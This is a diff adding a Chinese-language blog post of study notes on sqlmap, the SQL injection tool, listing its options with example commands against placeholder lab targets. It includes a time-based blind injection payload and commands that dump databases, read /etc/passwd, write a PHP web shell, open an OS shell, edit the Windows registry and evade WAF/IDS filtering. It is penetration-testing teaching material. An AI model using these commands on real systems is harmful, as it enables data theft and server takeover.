@@ -240,6 +240,583 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/" itemprop="url">Kali Linux笔记(五十一)：SQLMAP</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-15T14:12:52+08:00">
+                2020-01-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-SQLMAP自动注入"><a href="#1-SQLMAP自动注入" class="headerlink" title="1. SQLMAP自动注入"></a>1. SQLMAP自动注入</h4><ul>
+<li>开源sql注入漏洞检测、利用工具（python语言开发）</li>
+<li>检测动态页面中get/post参数、cookie、http头</li>
+<li>数据榨取</li>
+<li>文件系统访问</li>
+<li>操作系统命令执行</li>
+<li>引擎强大、特性丰富</li>
+<li>XSS漏洞检测</li>
+</ul>
+<blockquote>
+<pre><code>⭐WEB渗透需要深入掌握SQL漏洞的原理以及注入</code></pre></blockquote>
+<h4 id="2-SQLMAP–检测技术"><a href="#2-SQLMAP–检测技术" class="headerlink" title="2. SQLMAP–检测技术"></a>2. SQLMAP–检测技术</h4><ul>
+<li>基于布尔的盲注检测（真/假）</li>
+<li>基于时间的盲注检测（响应时间长短）<ul>
+<li>‘and (select * from (select(sleep(20)))a)–+</li>
+</ul>
+</li>
+<li>基于错误的检测</li>
+<li>基于UNION联合查询的检测<ul>
+<li>适用于通过循环直接输出联合查询结果，否则只显示第一项结果</li>
+</ul>
+</li>
+<li>基于堆叠查询的检测<ul>
+<li>;堆叠多个查询语句</li>
+<li>适用于非select的数据修改、删除操作</li>
+</ul>
+</li>
+<li>支持的数据库管理系统DBMS<ul>
+<li>MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>NOSQLMAP可以查询NOSQL数据库里面的类型（非关系型数据库）</code></pre></blockquote>
+<h4 id="3-SQLMAP–其他特性"><a href="#3-SQLMAP–其他特性" class="headerlink" title="3. SQLMAP–其他特性"></a>3. SQLMAP–其他特性</h4><ul>
+<li>数据库直接连接-d<ul>
+<li>不通过SQL注入，制定身份认证信息、IP、端口（Orcal 121，SQL Server 3433）</li>
+</ul>
+</li>
+<li>与burpsuite、google结合使用，支持政策表达式限定测试目标</li>
+<li>Get、Post、Cookie、Referer、User-Agent（随机或指定目标）<ul>
+<li>Cookie过期后自动处理Set-Cookie头，更新Cookie信息（SQLMAP自动探测）</li>
+</ul>
+</li>
+<li>限制：最大并发，延迟发送</li>
+<li>支持Basic、Digest、NTLM、客户端CA身份认证（软证书+pin码，对客户端的身份认证）</li>
+<li>数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称（无法进行union select）</li>
+<li>文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问windows注册表</li>
+<li>与w3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门</li>
+</ul>
+<h4 id="4-SQLMAP–安装与更新"><a href="#4-SQLMAP–安装与更新" class="headerlink" title="4. SQLMAP–安装与更新"></a>4. SQLMAP–安装与更新</h4><ul>
+<li>基于python2.7开发</li>
+<li>安装<ul>
+<li><strong><code>🔺命令：apt-get install git</code></strong></li>
+<li><strong><code>🔺命令：git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></strong></li>
+</ul>
+</li>
+<li>升级<ul>
+<li><strong><code>🔺命令：sqlmap --update</code></strong> 在线</li>
+<li><strong><code>🔺命令：git pull</code></strong> 离线</li>
+</ul>
+</li>
+<li>Kali集成版随Kali库更新（Kali rolling版本可以直接通过update、upgrade）</li>
+</ul>
+<blockquote>
+<pre><code>Kali集成版更新（▲ 2020.1.15 更新可能在bash中找不到sqlmap）
+1.git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+2.sqlmap --update</code></pre></blockquote>
+<h4 id="5-SQLMAP–Options-Target参数"><a href="#5-SQLMAP–Options-Target参数" class="headerlink" title="5. SQLMAP–Options/Target参数"></a>5. SQLMAP–Options/Target参数</h4><ul>
+<li>Options<ul>
+<li>-h（显示粗略信息)</li>
+<li>-hh（显示详细信息）</li>
+<li>–version（SQLMAP版本信息）</li>
+<li>-v （版本信息，分为0-5级，默认为1级）</li>
+</ul>
+</li>
+<li>Target<ul>
+<li>-d（直接连接，作为数据库的客户端）</li>
+<li>-u（URL地址，需要有变量名称）</li>
+<li>-l（log file记录日志，可以来自Burp or webscarab）</li>
+<li>-x（站点地图，可以提交以xml文件的形式）</li>
+<li>-m（url地址表，多个url地址保存为文本文件）</li>
+<li>-r（http头请求信息提交，保存http头请求信息）</li>
+<li>-g（Google搜索引擎，正则表达式）</li>
+<li>-c（配置文件，保存扫描的配置文件）</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-SQLMAP–Target-→-直接连接"><a href="#6-SQLMAP–Target-→-直接连接" class="headerlink" title="6. SQLMAP–Target → 直接连接"></a>6. SQLMAP–Target → 直接连接</h4><ul>
+<li>直接方法<ul>
+<li>sqlmap -d “mysql://user:<a href="mailto:password@192.168.1.1" target="_blank" rel="noopener">password@192.168.1.1</a>:3306/dvwa”</li>
+<li><ul>
+<li>–users（数据库的管理账号）</li>
+</ul>
+</li>
+<li>–banner（目标系统版本，数据库类型版本）</li>
+<li>–dbs（查询目标数据库管理系统的库）</li>
+<li>–schema（源数据库）</li>
+<li>-a（所有数据信息）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐查询结果，默认保存在：/root/.sqlmap/output/中</code></pre></blockquote>
+<h4 id="7-SQLMAP–Target-→-Get方法"><a href="#7-SQLMAP–Target-→-Get方法" class="headerlink" title="7. SQLMAP–Target → Get方法"></a>7. SQLMAP–Target → Get方法</h4><ul>
+<li>Get方法<ul>
+<li>sqlmap -u “<a href="http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;" target="_blank" rel="noopener">http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;</a> -p（只检查） username -f（数据库的指纹）</li>
+<li><ul>
+<li>–users（数据库的管理账号）</li>
+</ul>
+</li>
+<li>–banner（目标系统版本，数据库类型版本）</li>
+<li>–dbs（查询目标数据库管理系统的库）</li>
+<li>–schema（源数据库）</li>
+<li>-a（所有数据信息）</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-SQLMAP–Target-→-扫描URL列表文件"><a href="#8-SQLMAP–Target-→-扫描URL列表文件" class="headerlink" title="8. SQLMAP–Target → 扫描URL列表文件"></a>8. SQLMAP–Target → 扫描URL列表文件</h4><ul>
+<li>扫描URL列表文件<ul>
+<li><a href="http://1.1.1.1/vuln1.php?q=foobar" target="_blank" rel="noopener">http://1.1.1.1/vuln1.php?q=foobar</a></li>
+<li><a href="http://1.1.1.1/vuln3/id/1" target="_blank" rel="noopener">http://1.1.1.1/vuln3/id/1</a>*</li>
+<li>sqlmap -m list.txt</li>
+</ul>
+</li>
+</ul>
+<h4 id="9-SQLMAP–Target-→-扫描Google搜索结果"><a href="#9-SQLMAP–Target-→-扫描Google搜索结果" class="headerlink" title="9. SQLMAP–Target → 扫描Google搜索结果"></a>9. SQLMAP–Target → 扫描Google搜索结果</h4><ul>
+<li>扫描Google搜索结果（需要代理链，配置才能使用）<ul>
+<li>sqlmap.py -g “inurl:&quot;.php?id=1&quot;“</li>
+</ul>
+</li>
+</ul>
+<h4 id="10-SQLMAP–Target-→-POST方法"><a href="#10-SQLMAP–Target-→-POST方法" class="headerlink" title="10. SQLMAP–Target → POST方法"></a>10. SQLMAP–Target → POST方法</h4><ul>
+<li>使用http请求文件（burpsuite）<ul>
+<li>使用Burp，设置浏览器代理，POST提交数据的登录形式</li>
+<li>复制http请求头，gedit黏贴在新建request.txt中</li>
+<li>sqlmap -r request.txt（通过Burp抓取请求的文件）</li>
+</ul>
+</li>
+<li>使用burpsuite log文件<ul>
+<li>Options → Misc → Project Logging → Proxy Requests</li>
+<li>保存为log.txt，发送Http请求（关闭Intercept）</li>
+<li>sqlmap -l log.txt</li>
+</ul>
+</li>
+</ul>
+<h4 id="11-SQLMAP–Target-→-HTTPS"><a href="#11-SQLMAP–Target-→-HTTPS" class="headerlink" title="11. SQLMAP–Target → HTTPS"></a>11. SQLMAP–Target → HTTPS</h4><ul>
+<li>sqlmap -u “<a href="https://1.1.1.1/a.php?id=1:8843&quot;" target="_blank" rel="noopener">https://1.1.1.1/a.php?id=1:8843&quot;</a> –force-ssl</li>
+</ul>
+<h4 id="12-SQLMAP–Target-→-扫描配置文件"><a href="#12-SQLMAP–Target-→-扫描配置文件" class="headerlink" title="12. SQLMAP–Target → 扫描配置文件"></a>12. SQLMAP–Target → 扫描配置文件</h4><ul>
+<li>查找sqlmap.conf（/etc/sqlmap/sqlmap.conf）</li>
+<li>sqlmap -c sqlmap.conf</li>
+</ul>
+<h4 id="13-SQLMAP–REQUEST-→-数据段"><a href="#13-SQLMAP–REQUEST-→-数据段" class="headerlink" title="13. SQLMAP–REQUEST → 数据段"></a>13. SQLMAP–REQUEST → 数据段</h4><ul>
+<li>数据段： –data<ul>
+<li>get/post都适用</li>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”user=1&amp;pass=2（get的url参数部分/post的源代码）” -f</li>
+</ul>
+</li>
+</ul>
+<h4 id="14-SQLMAP–REQUEST-→-变量分隔符"><a href="#14-SQLMAP–REQUEST-→-变量分隔符" class="headerlink" title="14. SQLMAP–REQUEST → 变量分隔符"></a>14. SQLMAP–REQUEST → 变量分隔符</h4><ul>
+<li>变量分隔符： –param-del<ul>
+<li><a href="http://1.1.1.1/a.php?q=foo;id=1" target="_blank" rel="noopener">http://1.1.1.1/a.php?q=foo;id=1</a>  //  ;  &amp;</li>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”q=foo;id=1” –param-del=”;” -f</li>
+</ul>
+</li>
+</ul>
+<h4 id="15-SQLMAP–REQUEST-→-Cookie头"><a href="#15-SQLMAP–REQUEST-→-Cookie头" class="headerlink" title="15.SQLMAP–REQUEST → Cookie头"></a>15.SQLMAP–REQUEST → Cookie头</h4><ul>
+<li>–cookie</li>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=12&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=12&quot;</a> –cookie=”a=1；b=2（Cooke的值）” -f </li>
+<li>web应用需要基于cookie的身份认证</li>
+<li>检查存在cookie中的注入点（sqlmap自动测试）</li>
+<li>Set-Cookie/–drop-set-cookie</li>
+</ul>
+<blockquote>
+<pre><code>⭐SQLMAP扫描的Level1不会扫描cookie中存在的漏洞，至少得从Level2开始，--level 2</code></pre></blockquote>
+<h4 id="16-SQLMAP–REQUEST-→-Agent"><a href="#16-SQLMAP–REQUEST-→-Agent" class="headerlink" title="16. SQLMAP–REQUEST → Agent"></a>16. SQLMAP–REQUEST → Agent</h4><ul>
+<li>–user-agent<ul>
+<li>sqlmap/1.0-dev-xxxxxxxx(<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)</li>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –user-agent=”aaaaaa” –dbs</li>
+</ul>
+</li>
+<li>–random-agent<ul>
+<li>/usr/share/sqlmap/txt/yser-agents.txt</li>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –random-agent –dbs</li>
+</ul>
+</li>
+<li>sqlmap检查user-agent中的注入点：Level&gt;=3</li>
+<li>APP/WAF/IPS/IDS过滤异常user-agent时报错<ul>
+<li>[hh:mm:20][ERROR] the target URL responded with an unknown HTTP status code,try to force the HTTP User-Agent header with option –useragent or –random-agent</li>
+</ul>
+</li>
+</ul>
+<h4 id="17-SQLMAP–REQUEST-→-Host-Referer-额外的header"><a href="#17-SQLMAP–REQUEST-→-Host-Referer-额外的header" class="headerlink" title="17. SQLMAP–REQUEST → Host/Referer/额外的header"></a>17. SQLMAP–REQUEST → Host/Referer/额外的header</h4><ul>
+<li>Host头：–host<ul>
+<li>Level=5</li>
+</ul>
+</li>
+<li>Referer头：–referer<ul>
+<li>Level&gt;=3</li>
+</ul>
+</li>
+<li>额外的header：–headers<ul>
+<li>每个头单独一行（名称区分大小写，大小写敏感）</li>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –headers=”Host:<a href="http://www.a.com\nUser-Agent:yuanfh&quot;" target="_blank" rel="noopener">www.a.com\nUser-Agent:yuanfh&quot;</a></li>
+</ul>
+</li>
+<li>–method=GET/POST（发送请求的方法，指定请求方法）</li>
+</ul>
+<h4 id="18-SQLMAP–REQUEST-→-基于HTTP协议的身份验证"><a href="#18-SQLMAP–REQUEST-→-基于HTTP协议的身份验证" class="headerlink" title="18. SQLMAP–REQUEST → 基于HTTP协议的身份验证"></a>18. SQLMAP–REQUEST → 基于HTTP协议的身份验证</h4><ul>
+<li>基于HTTP协议的身份验证<ul>
+<li>Basic</li>
+<li>Digest</li>
+<li>NTLM</li>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –auth-type Basic –auth-cred “user:pass”</li>
+</ul>
+</li>
+<li>–auth-cert/–auth-file（基于客户端证书的身份认证）<ul>
+<li>–auth-file=”ca.PEM”</li>
+<li>含有私钥的PEM格式证书文件</li>
+<li>PEM格式的证书链文件</li>
+</ul>
+</li>
+</ul>
+<h4 id="19-SQLMAP–REQUEST-→-http-s-代理"><a href="#19-SQLMAP–REQUEST-→-http-s-代理" class="headerlink" title="19. SQLMAP–REQUEST → http(s)代理"></a>19. SQLMAP–REQUEST → http(s)代理</h4><ul>
+<li>http(s)代理（搜索引起：inurl:.php?id=）▲ 2020.1.15 SOCKET5代理不成功<ul>
+<li>–proxy=”<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a></li>
+<li>–proxy-cred=”name:pass”（代理的身份认证）</li>
+<li>–ignore-proxy（忽略系统级代理设置，通常用于扫描本地网络目标）</li>
+</ul>
+</li>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –proxy=”<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a> -f</li>
+</ul>
+<h4 id="20-SQLMAP–REQUEST-→-delay-timeout-retries-randomize"><a href="#20-SQLMAP–REQUEST-→-delay-timeout-retries-randomize" class="headerlink" title="20. SQLMAP–REQUEST → delay/timeout/retries/randomize"></a>20. SQLMAP–REQUEST → delay/timeout/retries/randomize</h4><ul>
+<li>–delay<ul>
+<li>每次http(s)请求之间的延迟时间，浮点数，单位为秒，默认无延迟</li>
+</ul>
+</li>
+<li>–timeout<ul>
+<li>请求超时时间，浮点数，默认为30秒</li>
+</ul>
+</li>
+<li>–retries<ul>
+<li>http(s)连接超时重试次数，默认为3秒</li>
+</ul>
+</li>
+<li>–randomize<ul>
+<li>长度、类型与原始值保持一致的前提下，指定每次请求随机取值的参数名</li>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=100&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=100&quot;</a> –randomize=”id”</li>
+</ul>
+</li>
+</ul>
+<h4 id="21-SQLMAP–REQUEST-→-scope-safe"><a href="#21-SQLMAP–REQUEST-→-scope-safe" class="headerlink" title="21. SQLMAP–REQUEST → scope/safe"></a>21. SQLMAP–REQUEST → scope/safe</h4><ul>
+<li>–scope<ul>
+<li>过滤日志内容，通过正则表达式筛选扫描对象</li>
+<li>sqlmap -l burp.log –scope=”(www)?.target.(com|net|org)”</li>
+<li>sqlmap -l 2.log –scope=”(19)?.168.20.(1|10|100)” –level 3 –dbs</li>
+<li>▲ User-agent中的注入点</li>
+</ul>
+</li>
+<li>–safe-url/–safe-freq<ul>
+<li>检测和盲注阶段会产生大量失败请求，服务器端可能因此销毁Session</li>
+<li>每发送–safe-freq次注入请求后，发送一次正常请求</li>
+</ul>
+</li>
+</ul>
+<h4 id="22-SQLMAP–REQUEST-→-skip-urlencode-eval"><a href="#22-SQLMAP–REQUEST-→-skip-urlencode-eval" class="headerlink" title="22. SQLMAP–REQUEST → skip-urlencode/eval"></a>22. SQLMAP–REQUEST → skip-urlencode/eval</h4><ul>
+<li>–skip-urlencode<ul>
+<li>默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据</li>
+</ul>
+</li>
+<li>–eval<ul>
+<li>每次请求前执行指定的python代码</li>
+<li>每次请求更改或增加新的参数值（时间依赖、其他参数值依赖）</li>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;</a> –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”</li>
+</ul>
+</li>
+</ul>
+<h4 id="23-SQLMAP–Optimization参数（性能优化）"><a href="#23-SQLMAP–Optimization参数（性能优化）" class="headerlink" title="23. SQLMAP–Optimization参数（性能优化）"></a>23. SQLMAP–Optimization参数（性能优化）</h4><ul>
+<li>-o（开启所有参数的优化，除threads参数外）</li>
+<li>–predict-output</li>
+<li>–keep-alive</li>
+<li>–null-connection</li>
+<li>–threads=THREADS</li>
+</ul>
+<h4 id="24-SQLMAP–Optimization-→-predict-output"><a href="#24-SQLMAP–Optimization-→-predict-output" class="headerlink" title="24. SQLMAP–Optimization → predict-output"></a>24. SQLMAP–Optimization → predict-output</h4><ul>
+<li>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率</li>
+<li>版本名、用户名、密码、Privileges、role、数据库名称、表名、列名</li>
+<li>▲ 与–threads参数不兼容</li>
+<li>统计表：/usr/share/sqlmap/txt/common-outputs.txt</li>
+</ul>
+<h4 id="25-SQLMAP–Optimization-→-Keep-alive"><a href="#25-SQLMAP–Optimization-→-Keep-alive" class="headerlink" title="25. SQLMAP–Optimization → Keep alive"></a>25. SQLMAP–Optimization → Keep alive</h4><ul>
+<li>–keep alive</li>
+<li>使用http(s)长连接，性能好</li>
+<li>▲ 与–proxy参数不兼容</li>
+<li>长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</li>
+</ul>
+<h4 id="26-SQLMAP–Optimization-→-null-connection"><a href="#26-SQLMAP–Optimization-→-null-connection" class="headerlink" title="26. SQLMAP–Optimization → null-connection"></a>26. SQLMAP–Optimization → null-connection</h4><ul>
+<li>–null-connection</li>
+<li>只获取相应页面的大小值，而非页面具体内容</li>
+<li>通常用于盲注判断真/假，降低网络带宽消耗</li>
+<li>▲ 与–text-only参数不兼容（基于页面内容的比较判断真/假）</li>
+</ul>
+<h4 id="27-SQLMAP–Optimization-→-threads"><a href="#27-SQLMAP–Optimization-→-threads" class="headerlink" title="27. SQLMAP–Optimization → threads"></a>27. SQLMAP–Optimization → threads</h4><ul>
+<li>–threads=THREADS</li>
+<li>最大并发线程</li>
+<li>盲注时每个线程获取一个字符（每个线程7次请求），获取完成后线程结束</li>
+<li>默认值为1，建议不要超过10，否则可能影响目标站点可用性</li>
+<li>▲ 与–predict-output参数不兼容</li>
+</ul>
+<blockquote>
+<pre><code>⭐7次请求即可以获取到一个ASCII码字符，即可打印字符为128个</code></pre></blockquote>
+<h4 id="28-SQLMAP–ENUMERATION-→-枚举数据库数据"><a href="#28-SQLMAP–ENUMERATION-→-枚举数据库数据" class="headerlink" title="28. SQLMAP–ENUMERATION → 枚举数据库数据"></a>28. SQLMAP–ENUMERATION → 枚举数据库数据</h4><ul>
+<li>–current-user（当前数据库管理系统账号）</li>
+<li>–current-db（当前数据库管理系统的数据库）</li>
+<li>–hostname（当前机器主机名）</li>
+<li>–users（数据库管理系统所有账号）</li>
+<li>–privileges -U username（CU当前账号）</li>
+<li>–roles（数据库角色）</li>
+<li>–dbs（数据库管理系统所有的数据库）</li>
+<li>–tables、–colums、–exclude-sysdbs（排除系统库）</li>
+<li>-D db（指定所使用的数据库）</li>
+<li>-T table（指定所使用的数据表）</li>
+<li>-C user –colusms（指定某个列）</li>
+<li>–schema（表结构）–batch（批处理） –exclude-sysdbs 元数据（使用默认选项）</li>
+<li>–count（表的行数）</li>
+</ul>
+<h4 id="29-SQLMAP–ENUMERATION-→-具体数据操作"><a href="#29-SQLMAP–ENUMERATION-→-具体数据操作" class="headerlink" title="29. SQLMAP–ENUMERATION → 具体数据操作"></a>29. SQLMAP–ENUMERATION → 具体数据操作</h4><p>f</p>
+<ul>
+<li>Dump数据<ul>
+<li>–dump,-C,-T,-D,–start,–stop</li>
+<li>–dump-all –exclude-sysdbs</li>
+<li>–sql-query “select * from users”</li>
+</ul>
+</li>
+</ul>
+<h4 id="30-SQLMAP–BRUFE-FORCE（暴力破解）"><a href="#30-SQLMAP–BRUFE-FORCE（暴力破解）" class="headerlink" title="30. SQLMAP–BRUFE FORCE（暴力破解）"></a>30. SQLMAP–BRUFE FORCE（暴力破解）</h4><ul>
+<li>Mysql&lt;5.0，没有information_schema库</li>
+<li>Mysql&gt;=5.0，但无权读取information_schema库</li>
+<li>微软的access数据库，默认无权读取MSysObjects库</li>
+<li>–common-tables</li>
+<li>–common-columns（Access系统表无列信息）</li>
+</ul>
+<h4 id="31-SQLMAP–UDF-INJECTION（用户自定义函数注入）"><a href="#31-SQLMAP–UDF-INJECTION（用户自定义函数注入）" class="headerlink" title="31. SQLMAP–UDF INJECTION（用户自定义函数注入）"></a>31. SQLMAP–UDF INJECTION（用户自定义函数注入）</h4><ul>
+<li>–udf-inject,–share-lib<ul>
+<li>编译共享库创建并上传至DB Server，以此生成UDF实现高级注入</li>
+<li>Linux：shared object</li>
+<li>Windows：DLL</li>
+<li><a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857" target="_blank" rel="noopener">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="32-SQLMAP–FILE-SYSTEM（文件系统）"><a href="#32-SQLMAP–FILE-SYSTEM（文件系统）" class="headerlink" title="32. SQLMAP–FILE SYSTEM（文件系统）"></a>32. SQLMAP–FILE SYSTEM（文件系统）</h4><ul>
+<li>–file-read=”/etc/passwd”</li>
+<li>–file-write=”shell.php” –file-dest=”/tmp/shell.php”</li>
+</ul>
+<h4 id="33-SQLMAP–OS（操作系统）"><a href="#33-SQLMAP–OS（操作系统）" class="headerlink" title="33. SQLMAP–OS（操作系统）"></a>33. SQLMAP–OS（操作系统）</h4><ul>
+<li>–os-cmd id（执行一个命令）</li>
+<li>–os-shell</li>
+<li>–sql-shell</li>
+<li>Mysql、postgresql<ul>
+<li>上传共享库并生成sys_exec()、sys_eval()两个UDF</li>
+</ul>
+</li>
+<li>Mssql<ul>
+<li>xp_cmdshell存储过程（有就用，禁了启，没有建）</li>
+</ul>
+</li>
+</ul>
+<h4 id="34-SQLMAP–WINDOWS-REGISTORY（Windows）"><a href="#34-SQLMAP–WINDOWS-REGISTORY（Windows）" class="headerlink" title="34. SQLMAP–WINDOWS REGISTORY（Windows）"></a>34. SQLMAP–WINDOWS REGISTORY（Windows）</h4><ul>
+<li>–reg-read</li>
+<li>–reg-add</li>
+<li>–reg-del</li>
+<li>–reg-key、–reg-value、–reg-data、–reg-type</li>
+<li>sqlmap –u=”<a href="http://1.1.1.1/a.aspx?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.aspx?id=1&quot;</a> –reg-add –regkey=”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value=Test -reg-type=REG_SZ –reg-data=1</li>
+</ul>
+<h4 id="35-SQLMAP–GENERAL（一般性参数）"><a href="#35-SQLMAP–GENERAL（一般性参数）" class="headerlink" title="35. SQLMAP–GENERAL（一般性参数）"></a>35. SQLMAP–GENERAL（一般性参数）</h4><ul>
+<li>-s（sqlite会话文件保存位置）</li>
+<li>-t（记录流量文件保存位置）</li>
+<li>–charset（强制字符编码）<ul>
+<li>–charset=GBK</li>
+</ul>
+</li>
+<li>–crawl（从起始位置爬站深度）<ul>
+<li>–batch –crawl=3</li>
+</ul>
+</li>
+<li>–csv-del（dump数据默认存于”,”分割的CSV文件，指定其他分隔符）<ul>
+<li>–csv-del=”;”</li>
+</ul>
+</li>
+<li>–dbms-cred（指定数据库账号）</li>
+<li>–flush-session（清空session）</li>
+<li>–force-ssl（https链接）</li>
+<li>–fresh-queries（忽略session查询结果）</li>
+<li>–hex（dump非ASCII码字符内容时，将其编码为16进制形式，收到后解码还原，防过滤）<ul>
+<li>sqlmap -u “<a href="http://1.1.1.1/s.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/s.php?id=1&quot;</a> –hex -v 3</li>
+</ul>
+</li>
+<li>–output-dir=/tmp</li>
+<li>–parse-errors（分析和现实数据库内建报错信息）<ul>
+<li>sqlmap -u “<a href="http://1.1.1.1/sqlmap/a.asp?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/sqlmap/a.asp?id=1&quot;</a> –parse-errors</li>
+</ul>
+</li>
+<li>–save（将命令保存成配置文件）</li>
+</ul>
+<h4 id="36-SQLMAP–MISCELLANEOUS-→-助记符（-z）"><a href="#36-SQLMAP–MISCELLANEOUS-→-助记符（-z）" class="headerlink" title="36. SQLMAP–MISCELLANEOUS → 助记符（-z）"></a>36. SQLMAP–MISCELLANEOUS → 助记符（-z）</h4><ul>
+<li>-z（参数助记符）</li>
+<li>原：sqlmap –batch –random-agent –ignore-proxy –technique=BEU -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
+<li>后：sqlmap -z “bat,randoma,ign,tec=BEU” -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a></li>
+<li>原：sqlmap –ignore-proxy –flush-session –technique=U –dump -D testdb -T users -u “1.1.1.1/a.php?id=1” </li>
+<li>后：sqlmap -z “ign,flu,bat,tec=U,dump,D=testdb,T=users” -u “1.1.1.1/ vuln.php?id=1”</li>
+</ul>
+<h4 id="37-SQLMAP–MISCELLANEOUS-→-answer-check-waf-hpp-identify-waf"><a href="#37-SQLMAP–MISCELLANEOUS-→-answer-check-waf-hpp-identify-waf" class="headerlink" title="37. SQLMAP–MISCELLANEOUS → answer/check-waf/hpp/identify-waf"></a>37. SQLMAP–MISCELLANEOUS → answer/check-waf/hpp/identify-waf</h4><ul>
+<li>–answer<ul>
+<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –technique=E –answers=”extending=N” –batch</li>
+</ul>
+</li>
+<li>–check-waf（检测WAF/IPS/IDS）</li>
+<li>–hpp（HTTP parameter pollution，Web Application的一个漏洞）<ul>
+<li>绕过WAF/IPS/IDS的有效方法</li>
+<li>尤其对ASP/IIS和ASP.NET/IIS</li>
+</ul>
+</li>
+<li>–identify-waf（彻底的waf/ips/ids检查）<ul>
+<li>检查30多种产品</li>
+</ul>
+</li>
+</ul>
+<h4 id="38-SQLMAP–MISCELLANEOUS-→-Misc"><a href="#38-SQLMAP–MISCELLANEOUS-→-Misc" class="headerlink" title="38. SQLMAP–MISCELLANEOUS → Misc"></a>38. SQLMAP–MISCELLANEOUS → Misc</h4><ul>
+<li>–mobile（模拟智能手机设备）</li>
